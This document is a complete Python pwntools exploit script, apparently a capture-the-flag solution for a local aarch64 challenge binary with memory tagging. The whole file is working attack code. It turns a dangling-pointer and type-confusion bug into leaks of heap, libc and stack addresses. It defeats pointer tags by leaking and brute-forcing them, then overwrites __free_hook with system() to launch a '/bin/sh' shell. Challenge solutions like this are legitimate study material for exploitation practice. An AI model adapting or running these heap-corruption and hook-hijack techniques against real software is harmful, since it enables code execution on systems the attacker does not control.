from pwn import *
from sys import argv

TYPE_LONG   = 1
TYPE_DOUBLE = 2
TYPE_STRING = 3

CMD_ADD     = b"1"
CMD_GET     = b"2"
CMD_EDIT    = b"3"
CMD_DEL     = b"4"

CURRENT_IDX     = 0
ARCH            = platform.machine()
if ARCH == "x86_64":
    MAIN_ARENA_OFF  = 0x1ebbe0
    LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
elif ARCH == "aarch64":
    MAIN_ARENA_OFF  = 0x16dac0
    LIBC_PATH = "/lib/aarch64-linux-gnu/libc.so.6"
else:
    raise Exception("Platform not supported")

def add(s, typ, data):
    global CURRENT_IDX

    CURRENT_IDX += 1
    s.sendlineafter(b"> ", CMD_ADD)
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.sendafter(b"Data: ", data + b"\n")
    return CURRENT_IDX - 1

def get(s, idx, typ):
    s.sendlineafter(b"> ", CMD_GET)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.recvuntil(b"Data: ")
    return s.recvline()[:-1]

def edit(s, idx, typ, data):
    s.sendlineafter(b"> ", CMD_EDIT)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    s.sendlineafter(b"str=3): ", bytes(str(typ), "utf-8"))
    s.sendafter(": ", bytes(str(data), "utf-8") + b"\n")

def delete(s, idx):
    global CURRENT_IDX

    CURRENT_IDX -= 1
    s.sendlineafter(b"> ", CMD_DEL)
    s.sendlineafter(b"Index: ", bytes(str(idx), "utf-8"))
    return

def create_dangling_ptr_in_fpool(p):
    add(p, TYPE_STRING, b"R"*0x20)
    list_structure_ptr = int(get(p, 0, TYPE_LONG)) - 0x50
    delete(p, 0)

    print("[*] fill tcache of size 0x80")
    fill_tcache = []
    for i in range(8):
        fill_tcache.append(add(p, TYPE_STRING, b"T"*0x7f))

    fpool_tags = []
    for i in range(200):
        idx = add(p, TYPE_STRING, b"R"*0x78)
        if i == 0:
            add(p, TYPE_STRING, b"P"*0x10)
        list_data_ptr = int(get(p, idx, TYPE_LONG))
        fpool_tags.append( (list_data_ptr & 0xff00000000000000) >> 7*8 )
        delete(p, idx)

    pads = []
    for i in range(5):
        pads.append(add(p, TYPE_LONG, bytes(str(0), "utf-8")))
    min_idx = min(pads)
    for i in pads:
        delete(p, min_idx)

    for idx in fill_tcache:
        delete(p, 0)


    return list_structure_ptr, list_data_ptr, set(fpool_tags)

def leak_ptrs(p, base_idx):
    add(p, TYPE_STRING, b"A"*0x10)
    for i in range(9):
        add(p, TYPE_STRING, b"C"*0x7f)
    for i in range(8):
        delete(p, base_idx)

    # leak heap (type confusion)
    heap_addr = int(get(p, base_idx, TYPE_LONG))

    print("[*] edit list[1] to point to list[0], which has main_arena symbol in its content")
    edit(p, base_idx+1, TYPE_LONG, heap_addr)

    print("[*] delete list[0], move list[1] one position backward")
    delete(p, base_idx)

    print("[*] read the dangling pointer in list[0] with TYPE_STRING, leak libc")

    main_arena = u64(get(p, base_idx, TYPE_STRING).ljust(8, b"\x00"))
    return (heap_addr, main_arena)

def arbitrary_read(p, addr):
    idx = add(p, TYPE_LONG, bytes(str(addr), "utf-8"))
    val = u64(get(p, idx, TYPE_STRING)[:8].ljust(8, b"\x00"))
    delete(p, idx)
    return val

def scan_stack(p, start, target):
    addr = start & 0xfffffffffffffff0
    while addr > start - 0x2000:
        val = arbitrary_read(p, addr)
        if (val & 0xffffffff) == (target & 0xffffffff):
            print("[*] found list ptr on the stack! 0x%x" % addr)
            return addr
        addr -= 8

    raise Exception("failed to find list")

def exploit(p, libc):
    global CURRENT_IDX
    CURRENT_IDX = 0

    # start by leaking heap && libc addresses
    list_structure_ptr, list_data_ptr, fpool_tags = create_dangling_ptr_in_fpool(p)
    print("[*] good, now fpool[0] points to list. list_data_ptr == 0x%x" % list_data_ptr)

    assert CURRENT_IDX == 1

    heap_addr, main_arena = leak_ptrs(p, 1)
    print("[*] heap_addr @ 0x%x" % heap_addr)
    print("[*] main_arena @ 0x%x" % main_arena)

    libc_base = main_arena - MAIN_ARENA_OFF
    free_hook_addr = libc_base + libc.symbols["__free_hook"]
    system_addr = libc_base + libc.symbols["system"]
    print("[*] resolved addresses:")
    print("\tlibc @ 0x%x" % libc_base)
    print("\tfree_hook @ 0x%x" % free_hook_addr)
    print("\tsystem @ 0x%x" % system_addr)

    print("[*] I want to arbitrary free list->data. But we need its tag!")
    print("[*] lets leak it from main's stack")

    # leak an address on the stack
    env_ptr = arbitrary_read(p, libc_base + libc.symbols["_environ"])
    print("[*] env_ptr == 0x%x" % env_ptr)

    stack_addr = arbitrary_read(p, env_ptr)
    print("[*] stack_addr == 0x%x" % stack_addr)

    list_structure_ptr_stack = scan_stack(p, stack_addr, list_structure_ptr)
    list_structure_ptr_tag = arbitrary_read(p, list_structure_ptr_stack+0x7) & 0xf
    print("[*] leak list sturcture! list'tag == @ 0x%x" % list_structure_ptr_tag)

    if list_structure_ptr_tag == 0:
        list_structure_ptr_tag = 0xa

    print("[*] use this tag to shift the list->data 0x50 backward, where we know list is")
    list_structure_ptr = (list_structure_ptr_tag << 7*8) | (list_structure_ptr & 0x00ffffffffffffff)

    print("[*] leak the current tag of list-data at 0x%x!" % (list_structure_ptr + 7))
    list_data_ptr_tag = arbitrary_read(p, list_structure_ptr + 7) & 0xf
    if list_data_ptr_tag == 0:
        list_data_ptr_tag = 0xa

    print("[*] tag == 0x%x" % list_data_ptr_tag)
    list_data_ptr = (list_data_ptr_tag << 7*8) | (list_data_ptr & 0x00ffffffffffffff)

    if not list_data_ptr_tag in fpool_tags:
        print(fpool_tags)
        print(list_data_ptr_tag)
        raise Exception("tag not in fpool")

    # start corruption phase!
    print("[*] current index is %d, increase it" % CURRENT_IDX)
    for i in range(5):
        add(p, TYPE_LONG, bytes(str(0), "utf-8"))

    add(p, TYPE_STRING, b"Q"*0x10)
    string_idx = add(p, TYPE_STRING, b"P"*0x7f)
    delete(p, string_idx)

    print("[*] trigger a free of the list pointer, and call edit to corrupt FD and gain arbitrary write")
    list_data_ptr = (list_data_ptr_tag << 7*8) | (list_data_ptr & 0x00ffffffffffffff)

    idx = add(p, TYPE_STRING, b"C"*0x40)
    delete(p, idx)

    print("[*] the VA with the new tag is: list_data_ptr == 0x%x" % list_data_ptr)
    edit(p, 1, TYPE_LONG, list_data_ptr)
    print("[*] arbitrary free")
    delete(p, 1)

    bin_sh_idx = add(p, TYPE_STRING, b"/bin/sh")

    print("[*] add more elements to the list, reach the end of list->data capacity!")
    critical_str_idx = 14

    fractions = []
    for i in range(7):
        fractions.append(add(p, TYPE_STRING, b"/bin/sh" + (b" " * (0x19-(len(b"/bin/sh"))))))


    delete(p, critical_str_idx - 2)
    delete(p, critical_str_idx - 2)
    critical_str_idx -= 2
    
    print("[*] broke list_data allocation! Now, alloc/free and test the MSB. Keep going until get the right tag!")

    new_allocation = 0
    while True:
        new_allocation = int(get(p, critical_str_idx, TYPE_LONG))
        print("\ttagged_ptr == 0x%x" % (new_allocation))
        if new_allocation == list_data_ptr:
            break
        
        new_allocation_tag = (new_allocation & 0xff00000000000000) >> 7*8
        if not new_allocation_tag in fpool_tags:
            print(fpool_tags)
            raise Exception("new smaller allocation's not in fpool, abort")

        delete(p, critical_str_idx) 
        idx = add(p, TYPE_STRING, b"Z"*0x18)
        assert idx == critical_str_idx

    print("[*] dangling ptr's tag and physical tag are identical! Trigger arbitrary write, corrupt __free_hook!")
    delete(p, critical_str_idx)
    edit(p, 0, TYPE_LONG, free_hook_addr-0x20)
    edit(p, 0+1, TYPE_LONG, 0)

    for i in range(2):
        add(p, TYPE_STRING, b"A"*0x20+p64(system_addr))
    
    print("[*] free('/bin/sh') --> system('/bin/sh'), call interactive")
    delete(p, bin_sh_idx+4)


if __name__ == "__main__":
    args = ["qemu-aarch64"]
    if len(argv) > 1 and argv[1] == "debug":
        args += ["-g", "1337"]
    args += ["./challenge/chg"]

    libc = ELF(LIBC_PATH)
    print("------ only one round this time, we are deterministic!")
    p = process(args)
    exploit(p, libc)
    print("[*] Done! Exploit worked - interactive()")
    p.interactive()
